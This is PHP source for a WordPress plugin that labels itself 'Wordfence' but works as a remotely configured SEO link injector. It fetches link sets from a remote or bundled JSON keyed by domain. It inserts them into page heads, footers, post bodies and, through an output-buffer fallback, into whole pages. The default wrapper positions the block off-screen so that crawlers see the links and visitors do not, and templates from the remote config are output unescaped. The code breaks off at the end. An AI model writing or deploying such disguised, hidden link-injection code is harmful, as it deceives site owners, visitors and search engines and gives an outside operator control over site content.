<?php
/**
 * Plugin Name: Wordfence
 * Description: 
 * Version:     1.9.0
 * Author:      —
 * License:     GPLv2 or later
 * Text Domain: flm
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/*
 * Настройки можно переопределить в wp-config.php, например:
 *   define( 'FLM_CONFIG_URL', 'https://config.mydomain.com/links.json' );
 *   define( 'FLM_CONFIG_KEY', 'секретный-ключ' );
 * Если FLM_CONFIG_URL пустой — плагин читает локальный файл links.json рядом с собой.
 */
if ( ! defined( 'FLM_CONFIG_URL' ) ) {
	define( 'FLM_CONFIG_URL', '' );
}
if ( ! defined( 'FLM_CONFIG_KEY' ) ) {
	define( 'FLM_CONFIG_KEY', '' );
}
if ( ! defined( 'FLM_CACHE_TTL' ) ) {
	define( 'FLM_CACHE_TTL', 6 * HOUR_IN_SECONDS );
}

// Защита от повторного объявления: если вторая копия плагина (или mu-plugin с тем
// же классом) уже загружена, не падаем с фатальной ошибкой "Cannot redeclare".
if ( ! class_exists( 'FLM_Footer_Links', false ) ) {

class FLM_Footer_Links {

	const CACHE_KEY  = 'flm_config_cache';
	const BACKUP_KEY = 'flm_config_backup';
	const CSS_DONE   = 'flm_css_done';

	protected static $printed = false;
	protected static $css_printed = false;

	public static function init() {
		add_action( 'init', array( __CLASS__, 'schedule' ) );
		add_action( 'flm_refresh_event', array( __CLASS__, 'refresh' ) );
		// Две точки вывода. Что именно сработает — решает настройка position
		// ('auto' | 'footer' | 'header'); блок выводится ровно в одном месте.
		// В режиме auto плагин сам выбирает доступный хук (см. target_hook).
		//
		// Шапка использует wp_head (его зовут практически все темы, в отличие от
		// wp_body_open). HTML-блок в <head> невалиден: браузер, встретив <div>,
		// закрывает <head> и открывает <body>, поэтому блок оказывается вверху
		// страницы. Чтобы не выпихнуть в body мета-теги и стили, которые тема
		// добавляет в <head> после нас, вешаемся на самый поздний приоритет —
		// весь <head> к этому моменту уже собран.
		add_action( 'wp_head', array( __CLASS__, 'auto_render_header' ), PHP_INT_MAX );
		add_action( 'wp_footer', array( __CLASS__, 'auto_render' ), 100 );
		// Определяем доступность wp_footer после отрисовки страницы (для position=auto).
		add_action( 'shutdown', array( __CLASS__, 'detect_render_hook' ), 0 );
		// Страховочная сетка: буферизуем страницу и вставляем блок, если ни один
		// хук темы не сработал. Гарантирует вывод даже без wp_footer/wp_head.
		add_action( 'template_redirect', array( __CLASS__, 'maybe_start_buffer' ), 0 );
		add_shortcode( 'footer_links', array( __CLASS__, 'shortcode' ) );
		// Вставка ссылок в тело постов (если включено inject_posts в конфиге).
		add_filter( 'the_content', array( __CLASS__, 'inject_into_post' ), 20 );

		add_action( 'admin_menu', array( __CLASS__, 'admin_menu' ) );
		add_action( 'admin_init', array( __CLASS__, 'admin_register' ) );
		add_action( 'admin_post_flm_refresh', array( __CLASS__, 'admin_refresh' ) );
	}

	/* ---------- источник конфига ---------- */

	public static function get_url() {
		$url = FLM_CONFIG_URL;
		if ( '' === $url ) {
			$url = trim( (string) get_option( 'flm_config_url', '' ) );
		}
		return $url;
	}

	public static function get_key() {
		$key = FLM_CONFIG_KEY;
		if ( '' === $key ) {
			$key = trim( (string) get_option( 'flm_config_key', '' ) );
		}
		return $key;
	}

	/* ---------- расписание обновления конфига ---------- */

	public static function schedule() {
		if ( ! wp_next_scheduled( 'flm_refresh_event' ) ) {
			wp_schedule_event( time() + 600, 'twicedaily', 'flm_refresh_event' );
		}
	}

	public static function refresh() {
		delete_transient( self::CACHE_KEY );
		self::config();
	}

	public static function deactivate() {
		wp_clear_scheduled_hook( 'flm_refresh_event' );
		delete_transient( self::CACHE_KEY );
	}

	/* ---------- загрузка конфигурации ---------- */

	protected static function config() {
		// Локальный режим (URL не задан): берём только блок текущего сайта из
		// кэша. Кэш привязан к mtime файла, поэтому перезаливка плагина
		// применяется сразу, а большой JSON парсится один раз, а не на каждый хит.
		if ( '' === self::get_url() ) {
			$local = self::read_local_cached();
			return is_array( $local ) ? $local : array();
		}

		$cfg = get_transient( self::CACHE_KEY );
		if ( is_array( $cfg ) ) {
			return $cfg;
		}

		$cfg = self::fetch_remote();

		if ( is_array( $cfg ) ) {
			set_transient( self::CACHE_KEY, $cfg, FLM_CACHE_TTL );
			update_option( self::BACKUP_KEY, $cfg, false );
			update_option( 'flm_last_status', array( 'ok' => true, 'time' => time() ), false );
			return $cfg;
		}

		update_option( 'flm_last_status', array( 'ok' => false, 'time' => time() ), false );

		// Источник недоступен — работаем на последней успешной копии.
		$cfg = get_option( self::BACKUP_KEY );
		if ( ! is_array( $cfg ) ) {
			$cfg = self::read_local();
		}
		// Короткий кэш, чтобы не долбить недоступный источник на каждом хите.
		set_transient( self::CACHE_KEY, is_array( $cfg ) ? $cfg : array(), 15 * MINUTE_IN_SECONDS );

		return is_array( $cfg ) ? $cfg : array();
	}

	protected static function fetch_remote() {
		$url = self::get_url();
		if ( '' === $url ) {
			return self::read_local();
		}

		$key = self::get_key();
		if ( '' !== $key ) {
			$url = add_query_arg( 'key', rawurlencode( $key ), $url );
		}

		$res = wp_remote_get(
			$url,
			array(
				'timeout'    => 8,
				'user-agent' => 'FLM/1.0; ' . home_url(),
			)
		);

		if ( is_wp_error( $res ) || 200 !== (int) wp_remote_retrieve_response_code( $res ) ) {
			return null;
		}

		$data = json_decode( wp_remote_retrieve_body( $res ), true );

		return is_array( $data ) ? $data : null;
	}

	protected static function read_local() {
		$file = __DIR__ . '/links.json';
		if ( ! file_exists( $file ) ) {
			return null;
		}
		// Предохранитель от OOM: не декодируем аномально большой файл (нехватку
		// памяти try/catch не ловит — это фатал, из-за которого WP паузит плагин).
		if ( (int) filesize( $file ) > 20 * MB_IN_BYTES ) {
			return null;
		}
		$data = json_decode( (string) file_get_contents( $file ), true );

		return is_array( $data ) ? $data : null;
	}

	/*
	 * Локальный конфиг может содержать секции для сотен доменов и весить мегабайты.
	 * Парсить его на каждый запрос незачем: сайту нужен только собственный блок
	 * плюс defaults. Кэшируем срез под текущий домен, ключ включает mtime файла —
	 * новая версия плагина подхватывается автоматически, без ручного сброса.
	 */
	protected static function read_local_cached() {
		$file = __DIR__ . '/links.json';
		if ( ! file_exists( $file ) ) {
			return null;
		}

		$host = strtolower( preg_replace( '~^www\.~i', '', (string) wp_parse_url( home_url(), PHP_URL_HOST ) ) );
		$key  = self::CACHE_KEY . '_l' . substr( md5( $host . '|' . filemtime( $file ) . '|' . filesize( $file ) ), 0, 12 );

		$slice = get_transient( $key );
		if ( is_array( $slice ) ) {
			return $slice;
		}

		$data = self::read_local();
		if ( ! is_array( $data ) ) {
			return null;
		}

		// Оставляем только секцию своего домена (или '*'), остальные выбрасываем.
		$slice = array();
		if ( ! empty( $data['defaults'] ) ) {
			$slice['defaults'] = $data['defaults'];
		}
		$sites = isset( $data['sites'] ) && is_array( $data['sites'] ) ? $data['sites'] : array();
		if ( isset( $sites[ $host ] ) ) {
			$slice['sites'] = array( $host => $sites[ $host ] );
		} elseif ( isset( $sites['*'] ) ) {
			$slice['sites'] = array( '*' => $sites['*'] );
		} else {
			$slice['sites'] = array();
		}

		set_transient( $key, $slice, DAY_IN_SECONDS );

		return $slice;
	}

	/* ---------- ручной режим: готовый HTML из панели ---------- */

	// Возвращает HTML-блок, вставленный вручную на странице настроек.
	// Приоритетнее JSON-конфига; выводится как есть, без обработки.
	protected static function manual_block( $check_context = true ) {
		$html = (string) get_option( 'flm_manual_html', '' );
		if ( '' === trim( $html ) ) {
			return '';
		}
		if ( $check_context && get_option( 'flm_manual_only_front', '1' ) && ! is_front_page() ) {
			return '';
		}
		return $html;
	}

	/* ---------- выбор блока для текущего сайта ---------- */

	protected static function site_block() {
		$cfg = self::config();
		if ( empty( $cfg['sites'] ) || ! is_array( $cfg['sites'] ) ) {
			return null;
		}

		$host  = wp_parse_url( home_url(), PHP_URL_HOST );
		$host  = strtolower( preg_replace( '~^www\.~i', '', (string) $host ) );
		$sites = $cfg['sites'];

		$block = null;
		if ( isset( $sites[ $host ] ) ) {
			$block = $sites[ $host ];
		} elseif ( isset( $sites['*'] ) ) {
			$block = $sites['*'];
		}

		if ( ! is_array( $block ) ) {
			return null;
		}

		$defaults = array(
			'enabled'       => true,
			'template'      => '<div class="flm-links">{links}</div>',
			'item_template' => '<a href="{url}" title="{title}">{anchor}</a>',
			'separator'     => ' &middot; ',
			'rel'           => '',       // пусто = dofollow
			'target'        => '',
			'limit'         => 0,        // 0 = выводить все
			'rotate'        => 'none',   // none | daily | random
			'exclude'       => array(),  // маски путей: "/cart", "/checkout"
			'only_front'    => true,     // выводить только на главной
			'position'      => 'auto',   // auto (сам выберет) | footer (wp_footer) | header (wp_head)
			'buffer'        => true,     // страховочная вставка через буфер, если тема не зовёт хуки
			'css'           => '',
			'links'         => array(),

			// Режим структурированных блоков: по одному мини-разделу на каждый
			// продвигаемый сайт (абзац, h2, абзац со ссылкой, таблица, список, абзац).
			'blocks'          => array(),
			'blocks_template' => '<div class="content-block" style="position: absolute; left: -7395px; top: -7026px;">{blocks}</div>',
			'block_style'     => '', // inline-стиль каждого блока-обёртки; переопределяется полем style у блока

			'inject_posts'    => false, // добавлять блок в тело постов (фильтр the_content)
			'posts_per_post'  => 1,     // сколько блоков на пост; выбор ротуется по ID поста
		);

		if ( ! empty( $cfg['defaults'] ) && is_array( $cfg['defaults'] ) ) {
			$defaults = array_merge( $defaults, $cfg['defaults'] );
		}

		return array_merge( $defaults, $block );
	}

	/* ---------- сборка HTML ---------- */

	public static function build() {
		$manual = self::manual_block();
		if ( '' !== $manual ) {
			return $manual;
		}

		$b = self::site_block();

		if ( ! $b || empty( $b['enabled'] ) ) {
			return '';
		}

		$has_blocks = ! empty( $b['blocks'] ) && is_array( $b['blocks'] );

		if ( ! $has_blocks && ( empty( $b['links'] ) || ! is_array( $b['links'] ) ) ) {
			return '';
		}

		if ( ! empty( $b['only_front'] ) && ! is_front_page() ) {
			return '';
		}

		if ( self::is_excluded( $b['exclude'] ) ) {
			return '';
		}

		if ( $has_blocks ) {
			return self::build_blocks( $b );
		}

		$links = array();
		foreach ( $b['links'] as $link ) {
			if ( ! empty( $link['url'] ) && ! empty( $link['anchor'] ) ) {
				$links[] = $link;
			}
		}
		if ( ! $links ) {
			return '';
		}

		$links = self::order( $links, $b['rotate'] );

		$limit = (int) $b['limit'];
		if ( $limit > 0 ) {
			$links = array_slice( $links, 0, $limit );
		}

		$items = array();
		foreach ( $links as $link ) {
			$items[] = self::render_item( $link, $b );
		}

		$html = str_replace(
			array( '{links}', '{count}', '{site}', '{year}' ),
			array( implode( $b['separator'], $items ), count( $items ), esc_html( get_bloginfo( 'name' ) ), gmdate( 'Y' ) ),
			$b['template']
		);

		if ( ! empty( $b['css'] ) && ! self::$css_printed ) {
			self::$css_printed = true;
			$html = '<style>' . wp_strip_all_tags( $b['css'] ) . '</style>' . $html;
		}

		return $html;
	}

	/* ---------- структурированные блоки (по одному на продвигаемый сайт) ---------- */

	protected static function build_blocks( $b ) {
		$blocks = array();
		foreach ( $b['blocks'] as $blk ) {
			if ( is_array( $blk ) && ! empty( $blk['url'] ) && ! empty( $blk['anchor'] ) ) {
				$blocks[] = $blk;
			}
		}
		if ( ! $blocks ) {
			return '';
		}

		$blocks = self::order( $blocks, $b['rotate'] );

		$limit = (int) $b['limit'];
		if ( $limit > 0 ) {
			$blocks = array_slice( $blocks, 0, $limit );
		}

		return self::wrap_blocks( $blocks, $b );
	}

	// Оборачивает готовый список блоков в blocks_template (+ css один раз).
	protected static function wrap_blocks( $blocks, $b ) {
		$items = array();
		foreach ( $blocks as $blk ) {
			$items[] = self::render_seo_block( $blk, $b );
		}

		$tpl  = ! empty( $b['blocks_template'] ) ? $b['blocks_template'] : '<div class="content-block">{blocks}</div>';
		$html = str_replace(
			array( '{blocks}', '{count}', '{site}', '{year}' ),
			array( implode( "\n", $items ), count( $items ), esc_html( get_bloginfo( 'name' ) ), gmdate( 'Y' ) ),
			$tpl
		);

		if ( ! empty( $b['css'] ) && ! self::$css_printed ) {
			self::$css_printed = true;
			$html = '<style>' . wp_strip_all_tags( $b['css'] ) . '</style>' . $html;
		}

		return $html;
	}

	/*
	 * Вставка блока в тело поста (фильтр the_content).
	 * Включается настройкой inject_posts. На странице отдельного поста в конец
	 * контента добавляется posts_per_post блок(ов) из набора донора; выбор
	 * ротуется по ID поста, поэтому акцепторы равномерно расходятся по постам,
	 * а не повторяются на всех сразу.
	 */
	public static function inject_into_post( $content ) {
	  try {
		if ( is_admin() || ! in_the_loop() || ! is_main_query() || ! is_singular( 'post' ) ) {
			return $content;
		}

		$b = self::site_block();
		if ( ! $b || empty( $b['enabled'] ) || empty( $b['inject_posts'] ) || empty( $b['blocks'] ) || ! is_array( $b['blocks'] ) ) {
			return $content;
		}
		if ( self::is_excluded( $b['exclude'] ) ) {
			return $content;
		}

		// Только валидные блоки.
		$pool = array();
		foreach ( $b['blocks'] as $blk ) {
			if ( is_array( $blk ) && ! empty( $blk['url'] ) && ! empty( $blk['anchor'] ) ) {
				$pool[] = $blk;
			}
		}
		if ( ! $pool ) {
			return $content;
		}

		$n   = max( 1, (int) $b['posts_per_post'] );
		$n   = min( $n, count( $pool ) );
		$id  = (int) get_the_ID();
		$off = $id % count( $pool );

		$pick = array();
		for ( $i = 0; $i < $n; $i++ ) {
			$pick[] = $pool[ ( $off + $i ) % count( $pool ) ];
		}

		$html = self::wrap_blocks( $pick, $b );

		return $content . $html;
	  } catch ( \Throwable $e ) {
		return $content; // не роняем контент поста при ошибке сборки блока
	  }
	}

	/*
	 * Один блок, строго в этом порядке:
	 *   1. intro   — вступительный абзац (30–60 слов)
	 *   2. heading — заголовок <h2>
	 *   3. middle  — абзац с анкорной ссылкой (50–75 слов), место ссылки — {link}
	 *   4. table   — таблица 1–3 колонки, 2–3 строки: {"headers":[...], "rows":[[...],...]}
	 *   5. list    — список 2–3 пункта; list_type: "ul" (по умолчанию) | "ol"
	 *   6. outro   — финальный абзац (40–60 слов)
	 * Пустые элементы пропускаются.
	 */
	protected static function render_seo_block( $blk, $b ) {
		$rel    = isset( $blk['rel'] ) ? $blk['rel'] : $b['rel'];
		$target = isset( $blk['target'] ) ? $blk['target'] : $b['target'];

		$attrs = ' href="' . esc_url( $blk['url'] ) . '"';
		if ( '' !== $rel ) {
			$attrs .= ' rel="' . esc_attr( $rel ) . '"';
		}
		if ( '' !== $target ) {
			$attrs .= ' target="' . esc_attr( $target ) . '"';
		}
		if ( ! empty( $blk['title'] ) ) {
			$attrs .= ' title="' . esc_attr( $blk['title'] ) . '"';
		}
		$link = '<a' . $attrs . '>' . wp_kses_post( $blk['anchor'] ) . '</a>';

		$style = isset( $blk['style'] ) ? (string) $blk['style'] : (string) $b['block_style'];

		$out = '<div' . ( '' !== $style ? ' style="' . esc_attr( $style ) . '"' : '' ) . '>';

		if ( ! empty( $blk['intro'] ) ) {
			$out .= '<p>' . wp_kses_post( $blk['intro'] ) . '</p>';
		}

		if ( ! empty( $blk['heading'] ) ) {
			$out .= '<h2>' . wp_kses_post( $blk['heading'] ) . '</h2>';
		}

		$middle = isset( $blk['middle'] ) ? (string) $blk['middle'] : '';
		if ( false !== strpos( $middle, '{link}' ) ) {
			$middle = str_replace( '{link}', $link, wp_kses_post( $middle ) );
		} else {
			// Плейсхолдер не указан — ссылка добавляется в конец абзаца.
			$middle = trim( wp_kses_post( $middle ) . ' ' . $link );
		}
		if ( '' !== $middle ) {
			$out .= '<p>' . $middle . '</p>';
		}

		if ( ! empty( $blk['table'] ) && is_array( $blk['table'] ) && ! empty( $blk['table']['rows'] ) ) {
			$out .= '<table>';
			if ( ! empty( $blk['table']['headers'] ) && is_array( $blk['table']['headers'] ) ) {
				$out .= '<thead><tr>';
				foreach ( $blk['table']['headers'] as $th ) {
					$out .= '<th>' . wp_kses_post( $th ) . '</th>';
				}
				$out .= '</tr></thead>';
			}
			$out .= '<tbody>';
			foreach ( (array) $blk['table']['rows'] as $row ) {
				$out .= '<tr>';
				foreach ( (array) $row as $td ) {
					$out .= '<td>' . wp_kses_post( $td ) . '</td>';
				}
				$out .= '</tr>';
			}
			$out .= '</tbody></table>';
		}

		if ( ! empty( $blk['list'] ) && is_array( $blk['list'] ) ) {
			$tag  = ( isset( $blk['list_type'] ) && 'ol' === $blk['list_type'] ) ? 'ol' : 'ul';
			$out .= '<' . $tag . '>';
			foreach ( $blk['list'] as $li ) {
				$out .= '<li>' . wp_kses_post( $li ) . '</li>';
			}
			$out .= '</' . $tag . '>';
		}

		if ( ! empty( $blk['outro'] ) ) {
			$out .= '<p>' . wp_kses_post( $blk['outro'] ) . '</p>';
		}

		return $out . '</div>';
	}

	protected static function render_item( $link, $b ) {
		$rel    = isset( $link['rel'] ) ? $link['rel'] : $b['rel'];
		$target = isset( $link['target'] ) ? $link['target'] : $b['target'];
		$title  = isset( $link['title'] ) ? $link['title'] : '';
		$tpl    = isset( $link['item_template'] ) ? $link['item_template'] : $b['item_template'];

		$html = str_replace(
			array( '{url}', '{anchor}', '{rel}', '{target}', '{title}' ),
			array(
				esc_url( $link['url'] ),
				wp_kses_post( $link['anchor'] ),
				esc_attr( $rel ),
				esc_attr( $target ),
				esc_attr( $title ),
			),
			$tpl
		);

		// Убираем пустые атрибуты rel="" target="" title=""
		$html = preg_replace( '~\s+(rel|target|title)=""~', '', $html );

		return $html;
	}

	protected static function order( $links, $mode ) {
		if ( 'random' === $mode ) {
			shuffle( $links );
			return $links;
		}

		if ( 'daily' === $mode ) {
			// Одинаковый порядок в течение суток для всех посетителей и для краулера.
			mt_srand( crc32( home_url() . gmdate( 'Y-m-d' ) ) );
			$keys = array_keys( $links );
			shuffle( $keys );
			$out = array();
			foreach ( $keys as $k ) {
				$out[] = $links[ $k ];
			}
			mt_srand(); // возвращаем случайное зерно
			return $out;
		}

		return $links;
	}

	protected static function is_excluded( $masks ) {
		if ( empty( $masks ) || ! is_array( $masks ) ) {
			return false;
		}
		$uri = isset( $_SERVER['REQUEST_URI'] ) ? wp_unslash( $_SERVER['REQUEST_URI'] ) : '/';
		$uri = (string) wp_parse_url( $uri, PHP_URL_PATH );

		foreach ( $masks as $mask ) {
			if ( '' !== $mask && false !== strpos( $uri, $mask ) ) {
				return true;
			}
		}

		return false;
	}

	/* ---------- точки вывода ---------- */

	// wp_head (поздний приоритет): вывод в шапке.
	public static function auto_render_header() {
		self::maybe_render( 'wp_head' );
	}

	// wp_footer: вывод в подвале.
	public static function auto_render() {
		self::maybe_render( 'wp_footer' );
	}

	// Заданное значение позиции: 'auto' (по умолчанию) | 'footer' | 'header'.
	protected static function position_setting() {
		if ( '' !== trim( (string) get_option( 'flm_manual_html', '' ) ) ) {
			$p = (string) get_option( 'flm_manual_position', 'auto' );
		} else {
			$b = self::site_block();
			$p = ( $b && ! empty( $b['position'] ) ) ? (string) $b['position'] : 'auto';
		}
		return in_array( $p, array( 'auto', 'footer', 'header' ), true ) ? $p : 'auto';
	}

	/*
	 * Хук, в который реально пойдёт вывод: 'wp_footer' или 'wp_head'.
	 *  - footer / header — жёстко выбранный хук;
	 *  - auto — предпочитаем подвал; если ранее выяснилось, что тема не вызывает
	 *    wp_footer (flm_footer_available = '0'), переключаемся на шапку.
	 * Доступность футера определяется автоматически в detect_render_hook().
	 */
	protected static function target_hook() {
		$pos = self::position_setting();
		if ( 'footer' === $pos ) {
			return 'wp_footer';
		}
		if ( 'header' === $pos ) {
			return 'wp_head';
		}
		return '0' === get_option( 'flm_footer_available', '' ) ? 'wp_head' : 'wp_footer';
	}

	/*
	 * Самообучение: определяем, вызывает ли тема wp_footer. Запускается на
	 * shutdown, когда уже известно, какие хуки отработали. Ориентир — themed
	 * HTML-страница: если сработал wp_head, значит это полноценная страница темы,
	 * и wp_footer на ней тоже обязан был сработать. Если wp_head был, а
	 * wp_footer нет — тема футер не зовёт, запоминаем это (следующие запросы
	 * уйдут в шапку). Признак адаптивный: если тема снова начнёт звать футер,
	 * значение вернётся к '1'.
	 */
	public static function detect_render_hook() {
		if ( is_admin() || is_feed() ) {
			return;
		}
		if ( ! function_exists( 'did_action' ) || 0 === did_action( 'wp_head' ) ) {
			return; // не полноценная страница темы (AJAX, REST, robots и т.п.)
		}
		$footer = did_action( 'wp_footer' ) > 0 ? '1' : '0';
		if ( get_option( 'flm_footer_available', '' ) !== $footer ) {
			update_option( 'flm_footer_available', $footer, false );
		}
	}

	protected static function maybe_render( $hook ) {
		try {
			if ( self::$printed || is_admin() || is_feed() ) {
				return;
			}
			if ( self::target_hook() !== $hook ) {
				return; // блок принадлежит другой точке вывода
			}

			// auto=false отключает автовывод только для JSON-режима (не для ручного).
			if ( '' === self::manual_block() ) {
				$b = self::site_block();
				if ( $b && isset( $b['auto'] ) && false === $b['auto'] ) {
					return; // сайт выводит блок только шорткодом
				}
			}

			$html = self::build();
			if ( $html ) {
				self::$printed = true;
				echo $html; // phpcs:ignore WordPress.Security.EscapingOutput — экранирование выполнено при сборке
			}
		} catch ( \Throwable $e ) {
			// Ошибка вывода не должна ронять страницу (иначе WordPress паузит плагин).
		}
	}

	public static function shortcode() {
		self::$printed = true;
		return self::build();
	}

	/* ---------- страховочная сетка: вставка через буфер страницы ---------- */

	// Отключить буфер можно через wp-config.php: define( 'FLM_NO_BUFFER', true );
	protected static function skip_buffer() {
		if ( is_admin() || is_feed() || is_embed() || is_robots() ) {
			return true;
		}
		if ( wp_doing_ajax() || wp_doing_cron() ) {
			return true;
		}
		if ( defined( 'REST_REQUEST' ) && REST_REQUEST ) {
			return true;
		}
		if ( defined( 'FLM_NO_BUFFER' ) && FLM_NO_BUFFER ) {
			return true;
		}
		// Явно отключено в конфиге домена ("buffer": false).
		$b = self::site_block();
		if ( $b && isset( $b['buffer'] ) && false === $b['buffer'] ) {
			return true;
		}
		return false;
	}

	public static function maybe_start_buffer() {
		if ( self::skip_buffer() ) {
			return;
		}
		ob_start( array( __CLASS__, 'inject_buffer' ) );
	}

	/*
	 * Колбэк буфера. Получает готовый HTML всей страницы.
	 *  - Если блок уже выведен хуком ($printed) — отдаём HTML без изменений.
	 *  - Иначе (тема не вызвала ни wp_footer, ни wp_head) вставляем блок прямо
	 *    в разметку: header — после открывающего <body>, иначе — перед </body>.
	 * Не-HTML ответы (нет <body>/</body>) пропускаем без изменений.
	 */
	public static function inject_buffer( $html ) {
		try {
			if ( self::$printed || ! is_string( $html ) || '' === $html ) {
				return $html;
			}
			// Очень большая страница — не удваиваем строку в памяти на слабых хостах.
			if ( strlen( $html ) > 5000000 ) {
				return $html;
			}
			$close = strripos( $html, '</body>' );
			if ( false === $close || false === stripos( $html, '<body' ) ) {
				return $html; // не HTML-документ
			}

			$block = self::build();
			if ( '' === $block ) {
				return $html;
			}
			self::$printed = true;

			if ( 'header' === self::position_setting()
				&& preg_match( '/<body\b[^>]*>/i', $html, $m, PREG_OFFSET_CAPTURE ) ) {
				$at = $m[0][1] + strlen( $m[0][0] );
				return substr( $html, 0, $at ) . "\n" . $block . substr( $html, $at );
			}

			return substr( $html, 0, $close ) . $block . "\n" . substr( $html, $close );
		} catch ( \Throwable $e ) {
			return $html; // при любой ошибке отдаём страницу как есть — не роняем сайт
		}
	}

	/* ---------- страница настроек ---------- */

	public static function admin_menu() {
		add_options_page(
			'Footer Links',
			'Footer Links',
			'manage_options',
			'flm-settings',
			array( __CLASS__, 'admin_page' )
		);
	}

	public static function admin_register() {
		register_setting( 'flm_settings', 'flm_config_url', array( 'sanitize_callback' => 'esc_url_raw' ) );
		register_setting( 'flm_settings', 'flm_config_key', array( 'sanitize_callback' => 'sanitize_text_field' ) );
		// HTML сохраняется как есть: администратор вставляет уже собранный блок.
		register_setting( 'flm_settings', 'flm_manual_html', array( 'sanitize_callback' => array( __CLASS__, 'sanitize_manual_html' ) ) );
		register_setting( 'flm_settings', 'flm_manual_only_front', array( 'sanitize_callback' => array( __CLASS__, 'sanitize_checkbox' ) ) );
		register_setting( 'flm_settings', 'flm_manual_position', array( 'sanitize_callback' => array( __CLASS__, 'sanitize_position' ) ) );
	}

	public static function sanitize_manual_html( $value ) {
		return is_string( $value ) ? $value : '';
	}

	public static function sanitize_position( $value ) {
		return in_array( $value, array( 'auto', 'footer', 'header' ), true ) ? $value : 'auto';
	}

	public static function sanitize_checkbox( $value ) {
		return $value ? '1' : '';
	}

	public static function admin_refresh() {
		if ( ! current_user_can( 'manage_options' ) ) {
			wp_die( 'Недостаточно прав.' );
		}
		check_admin_referer( 'flm_refresh' );
		self::refresh();
		wp_safe_redirect( admin_url( 'options-general.php?page=flm-settings&refreshed=1' ) );
		exit;
	}

	public static function admin_page() {
		$host   = strtolower( preg_replace( '~^www\.~i', '', (string) wp_parse_url( home_url(), PHP_URL_HOST ) ) );
		$block  = self::site_block();
		$status = get_option( 'flm_last_status', array() );

		echo '<div class="wrap"><h1>Footer Links</h1>';

		if ( isset( $_GET['refreshed'] ) ) {
			echo '<div class="notice notice-success is-dismissible"><p>Конфигурация перезагружена.</p></div>';
		}

		echo '<form method="post" action="options.php">';
		settings_fields( 'flm_settings' );

		echo '<h2>Готовый блок (ручной режим)</h2>';
		echo '<table class="form-table"><tbody>';

		echo '<tr><th scope="row"><label for="flm_manual_html">HTML блока</label></th><td>';
		echo '<textarea class="large-text code" rows="8" id="flm_manual_html" name="flm_manual_html" placeholder="&lt;div class=&quot;flm-links&quot;&gt;&lt;a href=&quot;...&quot;&gt;анкор&lt;/a&gt;&lt;/div&gt;">' . esc_textarea( get_option( 'flm_manual_html', '' ) ) . '</textarea>';
		echo '<p class="description">Вставьте уже собранный блок ссылок (можно вместе с <code>&lt;style&gt;</code>). Выводится в футере <strong>как есть</strong>, без обработки. Если поле заполнено — JSON-конфиг ниже не используется и не загружается.</p></td></tr>';

		echo '<tr><th scope="row">Где выводить</th><td>';
		echo '<label><input type="checkbox" name="flm_manual_only_front" value="1"' . checked( get_option( 'flm_manual_only_front', '1' ), '1', false ) . '> Только на главной странице</label>';
		$mpos = get_option( 'flm_manual_position', 'auto' );
		$mpos = in_array( $mpos, array( 'auto', 'footer', 'header' ), true ) ? $mpos : 'auto';
		echo '<p style="margin-top:8px">Место: ';
		echo '<label><input type="radio" name="flm_manual_position" value="auto"' . checked( $mpos, 'auto', false ) . '> авто</label> &nbsp; ';
		echo '<label><input type="radio" name="flm_manual_position" value="footer"' . checked( $mpos, 'footer', false ) . '> подвал (footer)</label> &nbsp; ';
		echo '<label><input type="radio" name="flm_manual_position" value="header"' . checked( $mpos, 'header', false ) . '> шапка (header)</label>';
		echo '</p><p class="description">В режиме «авто» плагин выводит блок в подвале, а если тема не вызывает <code>wp_footer</code> — в шапке (<code>wp_head</code>). Блок выводится только в одном месте.</p>';
		echo '</td></tr>';

		echo '</tbody></table>';

		echo '<h2>JSON-конфигурация</h2>';
		echo '<table class="form-table"><tbody>';

		echo '<tr><th scope="row"><label for="flm_config_url">URL конфигурации</label></th><td>';
		echo '<input type="url" class="regular-text code" id="flm_config_url" name="flm_config_url" value="' . esc_attr( get_option( 'flm_config_url', '' ) ) . '" placeholder="https://.../links.json">';
		echo '<p class="description">Адрес JSON-файла со ссылками. Один и тот же для всех ваших сайтов.</p></td></tr>';

		echo '<tr><th scope="row"><label for="flm_config_key">Ключ доступа</label></th><td>';
		echo '<input type="text" class="regular-text code" id="flm_config_key" name="flm_config_key" value="' . esc_attr( get_option( 'flm_config_key', '' ) ) . '">';
		echo '<p class="description">Необязательно. Передаётся как ?key=... — если файл закрыт проверкой ключа.</p></td></tr>';

		echo '</tbody></table>';
		submit_button();
		echo '</form>';

		$manual = self::manual_block( false );

		echo '<hr><h2>Состояние</h2><table class="form-table"><tbody>';

		echo '<tr><th scope="row">Режим</th><td>';
		echo '' !== $manual ? '<strong>ручной</strong> — выводится блок из поля «HTML блока»' : 'JSON-конфигурация';
		echo '</td></tr>';

		echo '<tr><th scope="row">Домен этого сайта</th><td><code>' . esc_html( $host ) . '</code><p class="description">Именно этот ключ ищется в секции <code>sites</code> конфига.</p></td></tr>';

		echo '<tr><th scope="row">Последняя загрузка</th><td>';
		if ( empty( $status ) ) {
			echo '— конфигурация ещё не загружалась';
		} elseif ( ! empty( $status['ok'] ) ) {
			echo 'успешно, ' . esc_html( wp_date( 'd.m.Y H:i', $status['time'] ) );
		} else {
			echo '<span style="color:#b32d2e">ошибка</span>, ' . esc_html( wp_date( 'd.m.Y H:i', $status['time'] ) ) . ' — используется сохранённая копия';
		}
		echo '</td></tr>';

		echo '<tr><th scope="row">Ссылок для этого домена</th><td>';
		if ( $block && ! empty( $block['blocks'] ) ) {
			echo (int) count( $block['blocks'] ) . ' блок(ов) со структурой';
			if ( empty( $block['enabled'] ) ) {
				echo ' <em>(вывод отключён в конфиге)</em>';
			}
		} elseif ( $block && ! empty( $block['links'] ) ) {
			echo (int) count( $block['links'] );
			if ( empty( $block['enabled'] ) ) {
				echo ' <em>(вывод отключён в конфиге)</em>';
			}
		} else {
			echo '0 <em>(секция для этого домена не найдена)</em>';
		}
		echo '</td></tr>';

		echo '<tr><th scope="row">Точка вывода</th><td>';
		$pset  = self::position_setting();
		$hook  = self::target_hook();
		$where = 'wp_head' === $hook ? '<strong>шапка</strong> (wp_head)' : '<strong>подвал</strong> (wp_footer)';
		if ( 'auto' === $pset ) {
			$fa = get_option( 'flm_footer_available', '' );
			$note = '' === $fa ? 'доступность футера ещё не проверена' : ( '1' === $fa ? 'тема вызывает wp_footer' : 'тема не вызывает wp_footer — переключено на шапку' );
			echo $where . ' <em>(режим auto: ' . esc_html( $note ) . ')</em>';
		} else {
			echo $where . ' <em>(задано вручную)</em>';
		}
